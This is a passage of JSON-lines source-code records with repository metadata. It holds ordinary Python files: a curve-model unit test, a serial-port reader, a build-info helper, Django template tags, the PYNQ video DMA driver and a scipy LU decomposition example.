name.startswith(\"chassis\"):\n            return \"CHASSIS\", None, pid\n        # Unknown\n        return None, None, None\n\n    def get_transceiver_pid(self, descr):\n        match = self.rx_trans.search(descr)\n        if match:\n            return \"Unknown | Transceiver | %s\" % match.group(1).upper()\n        return \"Unknown | Transceiver | Unknown\"\n"}
{"blob_id": "ec62c1d46aabfd5b1918edd414451252d7613fff", "directory_id": "f8eea4a4cc079ba830a27a2ce239aef451ed6597", "path": "/test/ec/test_model.py", "content_id": "b9d4383639a0120de5a832c55c6614b5050ba089", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "qalmaqihir/pyecsca", "snapshot_id": "f37a32a00ea47fff1db0d5bb42b28df7cce6b587", "revision_id": "28546dad01a25ce101d6b49924f521c2ef5ffa98", "branch_name": "refs/heads/master", "visit_date": "2023-02-18 19:59:11.612457", "revision_date": "2021-01-22 16:02:25", "committer_date": "2021-01-23 00:15:27", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "498", "extension": "py", "content": "from unittest import TestCase\n\nfrom pyecsca.ec.model import (ShortWeierstrassModel, MontgomeryModel, EdwardsModel,\n                              TwistedEdwardsModel)\n\n\nclass CurveModelTests(TestCase):\n\n    def test_load(self):\n        self.assertGreater(len(ShortWeierstrassModel().coordinates), 0)\n        self.assertGreater(len(MontgomeryModel().coordinates), 0)\n        self.assertGreater(len(EdwardsModel().coordinates), 0)\n        self.assertGreater(len(TwistedEdwardsModel().coordinates), 0)\n"}
{"blob_id": "41a9bd6d2b29918fe18077f39429237c9a463a16", "directory_id": "021aa9dc8757e238bc72a52d3c1fffe8b2777248", "path": "/pyserv/inpu.py", "content_id": "bfa7004d703febf69886dec25b6b32de11c96c14", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "valfeo14/uartpy", "snapshot_id": "a2dcf6203b98b98d0785bdcaad3b467dce0b4ef6", "revision_id": "18fbfaac5fe29fb4413365818322f4655f526d53", "branch_name": "refs/heads/main", "visit_date": "2023-06-29 10:29:22.283778", "revision_date": "2021-08-03 11:34:46", "committer_date": "2021-08-03 11:34:46", "github_id": "390611980", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "773", "extension": "py", "content": "#socat -d -d -v pty,rawer,echo=0,link=./reader pty,rawer,echo=0,link=./writer\n\nimport asyncio\nimport serial_asyncio\n\n\nasync def main(loop):\n    #reader, _ = await serial_asyncio.open_serial_connection(url='/dev/pts/1', baudrate=115200)\n    reader, _ = await serial_asyncio.open_serial_connection(url='/dev/ttyUSB0', baudrate=115200)\n    print('Reader created')\n    #received = recv(reader)\n    taskRec = asyncio.create_task(recv(reader))\n    await asyncio.wait({taskRec})\n\n\nasync def recv(r):\n    while True:\n        msg = await r.readuntil(b'\\n')\n        if msg.rstrip() == b'quit':\n            print('Done receiving')\n            break\n        print(f'received: {msg.rstrip().decode()}')\n\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(main(loop))\nloop.close()\n"}
{"blob_id": "5dc1e822bf186bddbf57c1b607638b5bf1b3dde1", "directory_id": "47988c4d1e2c07cd2465da204890f481d59dbd4b", "path": "/site_scons/build_info/base.py", "content_id": "9c92d043fe0e11eba042528ae03c77df300cc9fd", "detected_licenses": "['BSD-2-Clause', 'BSD-2-Clause-Patent']", "license_type": "permissive", "repo_name": "dsikich/daos", "snapshot_id": "974000a2e9a37c2edc994007f864ab69afe347e3", "revision_id": "13385f8eb3209dfe9f63772a68a3bb8cadaf2e23", "branch_name": "refs/heads/master", "visit_date": "2022-07-07 05:46:07.074084", "revision_date": "2022-06-29 13:01:52", "committer_date": "2022-06-29 13:01:52", "github_id": "242208796", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "NOASSERTION", "gha_event_created_at": "2021-12-07 21:17:27", "gha_created_at": "2020-02-21 18:50:31", "gha_language": "C", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3717", "extension": "py", "content": "# Copyright 2016-2022 Intel Corporation\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n# -*- coding: utf-8 -*-\n\"\"\"Classes for building external prerequisite components\"\"\"\n\nimport os\nimport sys\nimport datetime\nimport json\n\n\nclass BuildInfo():\n    \"\"\"A utility class to read build information\"\"\"\n\n    def __init__(self, filename=None):\n        self.info = {}\n        if filename is None:\n            return\n        try:\n            with open(filename, \"r\") as info_file:\n                self.info = json.load(info_file)\n        except ValueError:\n            print(\"Could not load build_info\")\n\n    def update(self, var, value):\n        \"\"\"save a variable in the build info\"\"\"\n        self.info[var] = value\n\n    def get(self, var, default=None):\n        \"\"\"Get the value of a variable from build info script\"\"\"\n        return self.info.get(var, default)\n\n    def save(self, filename):\n        \"\"\"Create a file to store path information for a build\"\"\"\n        with open(filename, \"w\") as build_info:\n            json.dump(self.info, build_info, skipkeys=True, indent=2)\n\n    def gen_script(self, script_name):\n        \"\"\"Generate a shell script to set PATH, LD_LIBRARY_PATH,\n           and PREFIX variables\"\"\"\n        with open(script_name, \"w\") as script:\n            script.write(\"# Automatically generated by %s at %s\\n\\n\" %\n                         (sys.argv[0], datetime.datetime.today()))\n\n            lib_paths = []\n            paths = []\n            components = []\n\n            for var in sorted(self.info.keys()):\n                if not isinstance(self.info[var], str):\n                    continue\n                if \"PREFIX\" not in var:\n                    continue\n                if self.info[var] == \"/usr\":\n                    continue\n                script.write(\"SL_%s=%s\\n\" % (var, self.info[var]))\n                components.append(var)\n                path = os.path.join(self.info[var], \"bin\")\n                lib = os.path.join(self.info[var], \"lib\")\n                lib64 = os.path.join(self.info[var], \"lib64\")\n                if os.path.exists(path) and path not in paths:\n                    paths.insert(0, path)\n                if os.path.exists(lib) and lib not in lib_paths:\n                    lib_paths.insert(0, lib)\n                if os.path.exists(lib64) and lib64 not in lib_paths:\n                    lib_paths.insert(0, lib64)\n            script.write(\"SL_LD_LIBRARY_PATH=%s\\n\" %\n                         os.pathsep.join(lib_paths))\n            script.write(\"SL_PATH=%s\\n\" % os.pathsep.join(paths))\n            script.write('SL_COMPONENTS=\"%s\"\\n' % ' '.join(components))\n            script.write(\"SL_BUILD_DIR=%s\\n\" % self.info[\"BUILD_DIR\"])\n\n\n__all__ = [\"BuildInfo\"]\n"}
{"blob_id": "097b761462d201b5046fcf8ce660b2172b30bc7a", "directory_id": "859be69dd940938eb3260353ebe9797cba73229b", "path": "/egciptvhome/templatetags/other_section.py", "content_id": "43015ed454dc1446f1b3330c9d5ea5de35326910", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Egctelecom/egciptv", "snapshot_id": "558e00b6dab5708e270b5bafc8ce77e7440fdcb1", "revision_id": "35715df08a82c7e74e8a41c4f6d325ed6365cdf6", "branch_name": "refs/heads/master", "visit_date": "2022-12-12 16:41:01.381816", "revision_date": "2019-11-27 13:42:27", "committer_date": "2019-11-27 13:42:27", "github_id": "222450679", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2022-12-08 03:04:16", "gha_created_at": "2019-11-18 13:03:22", "gha_language": "JavaScript", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1442", "extension": "py", "content": "from django import template\nfrom egciptvhome.models import Otherdetails\nfrom django.http import HttpResponse\nfrom adminsideserviceprovider.models import ManageServicePricedoc,ServicePlanWithHardware\nfrom sitefrontendbyadmin.models import Specialoffersdoc\nfrom ratecustomerbillingwithcdr.models import VoipLongDistanceRate\nimport re\n\nregister = template.Library()\n\n\n@register.simple_tag()\ndef other_section_data(cname):\n\tother_details = Otherdetails.objects.values('id', 'key', 'value').filter(key=cname)\n\treturn other_details\n\n\n@register.simple_tag()\ndef get_plans_doc(pk):\n\tother_details = ManageServicePricedoc.objects.values('id', 'service_price_doc_name','status','service_price_doc').filter(service_price_provider_id=pk)\n\treturn other_details\n\n\n@register.simple_tag()\ndef get_special_offers_doc(pk):\n\tother_details = Specialoffersdoc.objects.values('id', 'special_offers_doc_name','status','special_offers_doc').filter(special_offers_id=pk)\n\treturn other_details\n\n\n@register.simple_tag()\ndef get_voip_distence(tx):\n\ttext = tx\n\ttext = re.escape(text)  # make sure there are not regex specials\n\tdata = VoipLongDistanceRate.objects.values('id', 'country', 'prefix', 'rate').filter(\n\t\tcountry__iregex=r\"(^|\\s)%s\" % text)\n\treturn data\n\n\n@register.simple_tag()\ndef get_service_provider_hw(id):\n\t\tsp = ServicePlanWithHardware.objects.values('hw_id','hw_id__hw_title','hw_qty','hw_id__device_buy').filter(service_plan_id=id)\n\t\treturn sp\n\n\n\t\n\t\n\t\n"}
{"blob_id": "2f50bc560c44ecaa7f4ba6af12d47952c012ac19", "directory_id": "cbdaca905c8f1988413d72dbd537be3d8ffabf51", "path": "/pynq/lib/video/dma.py", "content_id": "b026e3b8d3f3357ed3e2de6db9687cf443564cf3", "detected_licenses": "['MIT', 'BSD-3-Clause']", "license_type": "permissive", "repo_name": "cathalmccabe/PYNQ", "snapshot_id": "ac79d36a00ba2891f6b9df8d986578734255a7b4", "revision_id": "829005ead0e5569f8d2d5ba9ef52d911060f6937", "branch_name": "refs/heads/master", "visit_date": "2022-10-30 08:58:59.177893", "revision_date": "2022-02-14 17:46:44", "committer_date": "2022-02-14 17:46:44", "github_id": "76650718", "star_events_count": "3", "fork_events_count": "7", "gha_license_id": "BSD-3-Clause", "gha_event_created_at": "2018-09-13 14:28:29", "gha_created_at": "2016-12-16 12:04:13", "gha_language": "Jupyter Notebook", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "22083", "extension": "py", "content": "#   Copyright (c) 2018, Xilinx, Inc.\n#   All rights reserved.\n#\n#   Redistribution and use in source and binary forms, with or without\n#   modification, are permitted provided that the following conditions are met:\n#\n#   1.  Redistributions of source code must retain the above copyright notice,\n#       this list of conditions and the following disclaimer.\n#\n#   2.  Redistributions in binary form must reproduce the above copyright\n#       notice, this list of conditions and the following disclaimer in the\n#       documentation and/or other materials provided with the distribution.\n#\n#   3.  Neither the name of the copyright holder nor the names of its\n#       contributors may be used to endorse or promote products derived from\n#       this software without specific prior written permission.\n#\n#   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n#   AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n#   THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n#   PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR\n#   CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n#   EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n#   PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;\n#   OR BUSINESS INTERRUPTION). HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n#   WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR\n#   OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF\n#   ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n__author__ = \"Peter Ogden\"\n__copyright__ = \"Copyright 2018, Xilinx\"\n__email__ = \"pynq_support@xilinx.com\"\n\nimport asyncio\nimport numpy as np\nfrom pynq import DefaultIP, allocate, UnsupportedConfiguration\n\n\nclass _FrameCache:\n    def __init__(self, mode, memory, capacity=5, cacheable=0):\n        self._cache = []\n        self._mode = mode\n        self._capacity = capacity\n        self._cacheable = cacheable\n        self._memory = memory\n\n    def getframe(self):\n        \"\"\"Retrieve a frame from the cache or create a new frame if the\n        cache is empty. The freebuffer method of the returned array is\n        overriden to return the object to the cache rather than freeing\n        the object.\n\n        \"\"\"\n        if self._cache:\n            frame = allocate(\n                shape=self._mode.shape, dtype='u1', cacheable=self._cacheable,\n                pointer=self._cache.pop(), cache=self, target=self._memory)\n        else:\n            frame = allocate(\n                shape=self._mode.shape, dtype=np.uint8,\n                cacheable=self._cacheable, cache=self, target=self._memory)\n        return frame\n\n    def return_pointer(self, pointer):\n        if len(self._cache) < self._capacity:\n            self._cache.append(pointer)\n\n    def clear(self):\n        self._cache.clear()\n\n\nclass AxiVDMA(DefaultIP):\n    \"\"\"Driver class for the Xilinx VideoDMA IP core\n\n    The driver is split into input and output channels are exposed using the\n    readchannel and writechannel attributes. Each channel has start and\n    stop methods to control the data transfer. All channels MUST be stopped\n    before reprogramming the bitstream or inconsistent behaviour may result.\n\n    The DMA uses a single ownership model of frames in that frames are either\n    owned by the DMA or the user code but not both. S2MMChannel.readframe\n    and MM2SChannel.newframe both return a frame to the user. It is the\n    user's responsibility to either free the frame using the freebuffer()\n    method or to hand ownership back to the DMA using MM2SChannel.writeframe.\n    Once ownership has been returned the user should not access the contents\n    of the frame as the underlying memory may be deleted without warning.\n\n    Attributes\n    ----------\n    readchannel : AxiVDMA.S2MMChannel\n        Video input DMA channel\n    writechannel : AxiVDMA.MM2SChannel\n        Video output DMA channel\n\n    \"\"\"\n    class _FrameList:\n        \"\"\"Internal helper class for handling the list of frames associated\n        with a DMA channel. Assumes ownership of all frames it contains\n        unless explicitly removed with takeownership\n\n        \"\"\"\n\n        def __init__(self, parent, offset, count):\n            self._frames = [None] * count\n            self._mmio = parent._mmio\n            self._offset = offset\n            self._slaves = set()\n            self.count = count\n            self.reload = parent.reload\n\n        def __getitem__(self, index):\n            frame = self._frames[index]\n            return frame\n\n        def takeownership(self, index):\n            self._frames[index] = None\n\n        def __len__(self):\n            return self.count\n\n        def __setitem__(self, index, frame):\n            self._frames[index] = frame\n            if frame is not None:\n                self._mmio.write(self._offset + 4 * index,\n                                 frame.physical_address)\n            else:\n                self._mmio.write(self._offset + 4 * index, 0)\n            self.reload()\n            for s in self._slaves:\n                s[index] = frame\n                s.takeownership(index)\n\n        def addslave(self, slave):\n            self._slaves.add(slave)\n            for i in range(len(self._frames)):\n                slave[i] = self[i]\n                slave.takeownership(i)\n            slave.reload()\n\n        def removeslave(self, slave):\n            self._slaves.remove(slave)\n\n    class S2MMChannel:\n        \"\"\"Read channel of the Video DMA\n\n        Brings frames from the video input into memory. Hands ownership of\n        the read frames to the user code.\n\n        Attributes\n        ----------\n        mode : VideoMode\n            The video mode of the DMA channel\n        cacheable_frames : bool\n            Whether frames should be stored in cacheable or\n            non-cacheable memory\n\n        \"\"\"\n\n        def __init__(self, parent, interrupt, memory):\n            self._mmio = parent.mmio\n            self._frames = AxiVDMA._FrameList(self, 0xAC, parent.framecount)\n            self._interrupt = interrupt\n            self._sinkchannel = None\n            self._mode = None\n            self.memory = memory\n            self.cacheable_frames = True\n\n        def _readframe_internal(self):\n            if self._mmio.read(0x34) & 0x8980:\n                # Some spurious errors can occur at the start of transfers\n                # let's ignore them for now\n                self._mmio.write(0x34, 0x8980)\n            self.irqframecount = 1\n            nextframe = self._cache.getframe()\n            previous_frame = (self.activeframe + 2) % len(self._frames)\n            captured = self._frames[previous_frame]\n            self._frames.takeownership(previous_frame)\n            self._frames[previous_frame] = nextframe\n            post_frame = (self.activeframe + 2) % len(self._frames)\n            captured.invalidate()\n            return captured\n\n        def readframe(self):\n            \"\"\"Read a frame from the channel and return to the user\n\n            This function may block until a complete frame has been read. A\n            single frame buffer is kept so the first frame read after a long\n            pause in reading may return a stale frame. To ensure an up-to-date\n            frame when starting processing video read an additional time\n            before starting the processing loop.\n\n            Returns\n            -------\n            numpy.ndarray of the video frame\n\n            \"\"\"\n            if not self.running:\n                raise RuntimeError('DMA channel not started')\n            while self._mmio.read(0x34) & 0x1000 == 0:\n                loop = asyncio.get_event_loop()\n                loop.run_until_complete(\n                    asyncio.ensure_future(self._interrupt.wait()))\n                pass\n            self._mmio.write(0x34, 0x1000)\n            return self._readframe_internal()\n\n        async def readframe_async(self):\n            \"\"\"Read a frame from the channel, yielding instead of blocking\n            if no data is available. See readframe for more details\n\n            \"\"\"\n            if not self.running:\n                raise RuntimeError('DMA channel not started')\n            while self._mmio.read(0x34) & 0x1000 == 0:\n                await self._interrupt.wait()\n            self._mmio.write(0x34, 0x1000)\n            return self._readframe_internal()\n\n        @property\n        def activeframe(self):\n            \"\"\"The frame index currently being processed by the DMA\n\n            This process requires clearing any error bits in the DMA channel\n\n            \"\"\"\n            self._mmio.write(0x34, 0x4090)\n            return (self._mmio.read(0x28) >> 24) & 0x1F\n\n        @property\n        def desiredframe(self):\n            \"\"\"The next frame index to the processed by the DMA\n\n            \"\"\"\n            return (self._mmio.read(0x28) >> 8) & 0x1F\n\n        @desiredframe.setter\n        def desiredframe(self, frame_number):\n            if frame_number < 0 or frame_number >= len(self._frames):\n                raise ValueError(\"Invalid frame index\")\n            register_value = self._mmio.read(0x28)\n            mask = ~(0x1F << 8)\n            register_value &= mask\n            register_value |= (frame_number << 8)\n            self._mmio.write(0x28, register_value)\n\n        @property\n        def mode(self):\n            \"\"\"The video mode of the DMA. Must be set prior to starting.\n            Changing this while the DMA is running will result in the DMA\n            being stopped.\n\n            \"\"\"\n            return self._mode\n\n        @mode.setter\n        def mode(self, value):\n            if self.running:\n                self.stop()\n            self._mode = value\n\n        @property\n        def running(self):\n            \"\"\"Is the DMA channel running\n\n            \"\"\"\n            return (self._mmio.read(0x34) & 0x1) == 0\n\n        @property\n        def parked(self):\n            \"\"\"Is the channel parked or running in circular buffer mode\n\n            \"\"\"\n            return self._mmio.read(0x30) & 0x2 == 0\n\n        @parked.setter\n        def parked(self, value):\n            register = self._mmio.read(0x30)\n            if value:\n                register &= ~0x2\n            else:\n                register |= 0x2\n            self._mmio.write(0x30, register)\n\n        @property\n        def irqframecount(self):\n            register = self._mmio.read(0x30)\n            return (register >> 16) & 0xFF\n\n        @irqframecount.setter\n        def irqframecount(self, val):\n            register = self._mmio.read(0x30)\n            newregister = (register & 0xFF00FFFF) | (val << 16)\n            if register != newregister:\n                self._mmio.write(0x30, newregister)\n\n        def start(self):\n            \"\"\"Start the DMA. The mode must be set prior to this being called\n\n            \"\"\"\n            if not self._mode:\n                raise RuntimeError(\"Video mode not set, channel not started\")\n            self.desiredframe = 0\n            self._cache = _FrameCache(\n                    self._mode, self.memory, cacheable=self.cacheable_frames)\n            for i in range(len(self._frames)):\n                self._frames[i] = self._cache.getframe()\n\n            self._writemode()\n            self.reload()\n            self._mmio.write(0x30, 0x00011083)  # Start DMA\n            self.irqframecount = 4  # Ensure all frames are written to\n            self._mmio.write(0x34, 0x1000)  # Clear any interrupts\n            while not self.running:\n                pass\n            self.reload()\n            self.desiredframe = 1\n\n        def stop(self):\n            \"\"\"Stops the DMA, clears the frame cache and unhooks any tied\n            outputs\n\n            \"\"\"\n            self.tie(None)\n            self._mmio.write(0x30, 0x00011080)\n            while self.running:\n                pass\n            for i in range(len(self._frames)):\n                self._frames[i] = None\n            if hasattr(self, '_cache'):\n                self._cache.clear()\n\n        def _writemode(self):\n            self._mmio.write(0xA4, self._mode.width *\n                             self._mode.bytes_per_pixel)\n            self._mmio.write(0xA8, self._mode.stride)\n\n        def reload(self):\n            \"\"\"Reload the configuration of the DMA. Should only be called\n            by the _FrameList class or if you really know what you are doing\n\n            \"\"\"\n            if self.running:\n                self._mmio.write(0xA0, self._mode.height)\n\n        def reset(self):\n            \"\"\"Soft reset the DMA. Finishes all transfers before starting\n            the reset process\n\n            \"\"\"\n            self.stop()\n            self._mmio.write(0x30, 0x00011084)\n            while self._mmio.read(0x30) & 0x4 == 4:\n                pass\n\n        def tie(self, channel):\n            \"\"\"Ties an output channel to this input channel. This is used\n            to pass video from input to output without invoking the CPU\n            for each frame. Main use case is when some slow processing is\n            being done on a subset of frames while the video is passed\n            through directly to the output. Only one output may be tied\n            to an output. The tie is broken either by calling tie(None) or\n            writing a frame to the tied output channel.\n\n            \"\"\"\n            if self._sinkchannel:\n                self._frames.removeslave(self._sinkchannel._frames)\n                self._sinkchannel.parked = True\n                self._sinkchannel.sourcechannel = None\n            self._sinkchannel = channel\n            if self._sinkchannel:\n                self._frames.addslave(self._sinkchannel._frames)\n                self._sinkchannel.parked = False\n                self._sinkchannel.framedelay = 1\n                self._sinkchannel.sourcechannel = self\n\n    class MM2SChannel:\n        \"\"\"DMA channel from memory to a video output.\n\n        Will continually repeat the most recent frame written.\n\n        Attributes\n        ----------\n        mode : VideoMode\n            Video mode of the DMA channel\n        cacheable_frames : bool\n            Whether frames should be stored in cacheable or\n            non-cacheable memory\n\n        \"\"\"\n\n        def __init__(self, parent, interrupt, memory):\n            self._mmio = parent.mmio\n            self._frames = AxiVDMA._FrameList(self, 0x5C, parent.framecount)\n            self._interrupt = interrupt\n            self._mode = None\n            self.sourcechannel = None\n            self.cacheable_frames = True\n            self.memory = memory\n\n        def start(self):\n            \"\"\"Start the DMA channel with a blank screen. The mode must\n            be set prior to calling or a RuntimeError will result.\n\n            \"\"\"\n            if not self._mode:\n                raise RuntimeError(\"Video mode not set, channel not started\")\n            self._cache = _FrameCache(\n                    self._mode, self.memory, cacheable=self.cacheable_frames)\n            self._frames[0] = self._cache.getframe()\n            self._writemode()\n            self.reload()\n            self._mmio.write(0x00, 0x00011089)\n            while not self.running:\n                pass\n            self.reload()\n            self.desiredframe = 0\n            pass\n\n        def stop(self):\n            \"\"\"Stop the DMA channel and empty the frame cache\n\n            \"\"\"\n            self._mmio.write(0x00, 0x00011080)\n            while self.running:\n                pass\n            for i in range(len(self._frames)):\n                self._frames[i] = None\n            if hasattr(self, '_cache'):\n                self._cache.clear()\n\n        def reset(self):\n            \"\"\"Soft reset the DMA channel\n\n            \"\"\"\n            self.stop()\n            self._mmio.write(0x00, 0x00011084)\n            while self._mmio.read(0x00) & 0x4 == 4:\n                pass\n\n        def _writeframe_internal(self, frame):\n            if self.sourcechannel:\n                self.sourcechannel.tie(None)\n\n            frame.flush()\n            next_frame = (self.desiredframe + 1) % len(self._frames)\n            self._frames[next_frame] = frame\n            self.desiredframe = next_frame\n\n        def writeframe(self, frame):\n            \"\"\"Schedule the specified frame to be the next one displayed.\n            Assumes ownership of frame which should no longer be modified\n            by the user. May block if there is already a frame scheduled.\n\n            \"\"\"\n            if not self.running:\n                raise RuntimeError('DMA channel not started')\n            while self._mmio.read(0x04) & 0x1000 == 0:\n                loop = asyncio.get_event_loop()\n                loop.run_until_complete(\n                    asyncio.ensure_future(self._interrupt.wait()))\n            self._mmio.write(0x04, 0x1000)\n            self._writeframe_internal(frame)\n\n        async def writeframe_async(self, frame):\n            \"\"\"Same as writeframe() but yields instead of blocking if a\n            frame is already scheduled\n\n            \"\"\"\n            if not self.running:\n                raise RuntimeError('DMA channel not started')\n            while self._mmio.read(0x04) & 0x1000 == 0:\n                await self._interrupt.wait()\n            self._mmio.write(0x04, 0x1000)\n            self._writeframe_internal(frame)\n\n        def setframe(self, frame):\n            \"\"\"Sets a frame without blocking or taking ownership. In most\n            circumstances writeframe() is more appropriate\n\n            \"\"\"\n            frameindex = self.desiredframe\n            self._frames[frameindex] = frame\n            self._frames.takeownership(frameindex)\n\n        def _writemode(self):\n            self._mmio.write(0x54, self._mode.width *\n                             self._mode.bytes_per_pixel)\n            register = self._mmio.read(0x58)\n            register &= (0xF << 24)\n            register |= self._mode.stride\n            self._mmio.write(0x58, register)\n\n        def reload(self):\n            \"\"\"Reload the configuration of the DMA. Should only be called\n            by the _FrameList class or if you really know what you are doing\n\n            \"\"\"\n            if self.running:\n                self._mmio.write(0x50, self._mode.height)\n\n        def newframe(self):\n            \"\"\"Returns a frame of the appropriate size for the video mode.\n\n            The contents of the frame are undefined and should not be assumed\n            to be black\n\n            Returns\n            -------\n            numpy.ndarray video frame\n\n            \"\"\"\n            return self._cache.getframe()\n\n        @property\n        def activeframe(self):\n            self._mmio.write(0x04, 0x4090)\n            return (self._mmio.read(0x28) >> 16) & 0x1F\n\n        @property\n        def desiredframe(self):\n            return self._mmio.read(0x28) & 0x1F\n\n        @desiredframe.setter\n        def desiredframe(self, frame_number):\n            if frame_number < 0 or frame_number >= len(self._frames):\n                raise ValueError(\"Invalid Frame Index\")\n            register_value = self._mmio.read(0x28)\n            mask = ~0x1F\n            register_value &= mask\n            register_value |= frame_number\n            self._mmio.write(0x28, register_value)\n\n        @property\n        def running(self):\n            return (self._mmio.read(0x04) & 0x1) == 0\n\n        @property\n        def mode(self):\n            \"\"\"The video mode of the DMA, must be called prior to starting.\n            If changed while the DMA channel is running the channel will be\n            stopped\n\n            \"\"\"\n            return self._mode\n\n        @mode.setter\n        def mode(self, value):\n            if self.running:\n                self.stop()\n            self._mode = value\n\n        @property\n        def parked(self):\n            \"\"\"Is the channel parked or running in circular buffer mode\n\n            \"\"\"\n            return self._mmio.read(0x00) & 0x2 == 0\n\n        @parked.setter\n        def parked(self, value):\n            register = self._mmio.read(0x00)\n            if value:\n                self.desiredframe = self.activeframe\n                register &= ~0x2\n            else:\n                register |= 0x2\n            self._mmio.write(0x00, register)\n\n        @property\n        def framedelay(self):\n            register = self._mmio.read(0x58)\n            return register >> 24\n\n        @framedelay.setter\n        def framedelay(self, value):\n            register = self._mmio.read(0x58)\n            register &= 0xFFFF\n            register |= value << 24\n            self._mmio.write(0x58, register)\n\n    def __init__(self, description, framecount=None):\n        \"\"\"Create a new instance of the AXI Video DMA driver\n\n        Parameters\n        ----------\n        name : str\n            The name of the IP core to instantiate the driver for\n\n        \"\"\"\n        super().__init__(description)\n        if 'parameters' in description:\n            parameters = description['parameters']\n            has_s2mm = parameters['C_INCLUDE_S2MM'] == '1'\n            has_mm2s = parameters['C_INCLUDE_MM2S'] == '1'\n            framecount = int(parameters['C_NUM_FSTORES'])\n            s2mm_addr_width = int(parameters['C_M_AXI_S2MM_ADDR_WIDTH'])\n            mm2s_addr_width = int(parameters['C_M_AXI_MM2S_ADDR_WIDTH'])\n            if ((has_s2mm and s2mm_addr_width > 32) or\n                    (has_mm2s and mm2s_addr_width > 32)):\n                raise UnsupportedConfiguration(\n                    'VDMA driver only supports 32-bit addresses')\n\n        else:\n            has_s2mm = True\n            has_mm2s = True\n            framecount = 4 if framecount is None else framecount\n\n        self.framecount = framecount\n        memory = description['device'].default_memory\n        if has_s2mm:\n            self.readchannel = AxiVDMA.S2MMChannel(self, self.s2mm_introut,\n                    memory)\n        if has_mm2s:\n            self.writechannel = AxiVDMA.MM2SChannel(self, self.mm2s_introut,\n                    memory)\n\n    bindto = ['xilinx.com:ip:axi_vdma:6.2',\n              'xilinx.com:ip:axi_vdma:6.3']\n"}
{"blob_id": "d9d5c25de525edddf8ff8c2940171ca24906573f", "directory_id": "08124542e11f3a0541c21b93878b5e19a23e77a0", "path": "/PLU.py", "content_id": "57ded345e667a8c36888c483ecfb4ce8cb2e6988", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "dongyeon94/basic-exercise-Python", "snapshot_id": "ad0a2ebd78b542fca6fcf6f6f3c536a392f55688", "revision_id": "a6c5a9d64ed0cbdbc0d694c8c399123ca6bc1a9d", "branch_name": "refs/heads/master", "visit_date": "2020-04-04 16:35:22.575393", "revision_date": "2018-11-04 13:18:16", "committer_date": "2018-11-04 13:18:16", "github_id": "156084035", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "163", "extension": "py", "content": "import numpy  as n\nimport scipy\nimport scipy.linalg\n\na= n.array([[2,1,1],[4,-6,0],[-2,7,2]])\nP,L,U = scipy.linalg.lu(a)\n\nprint(P)\nprint()\nprint(L)\nprint()\nprint(U)"}
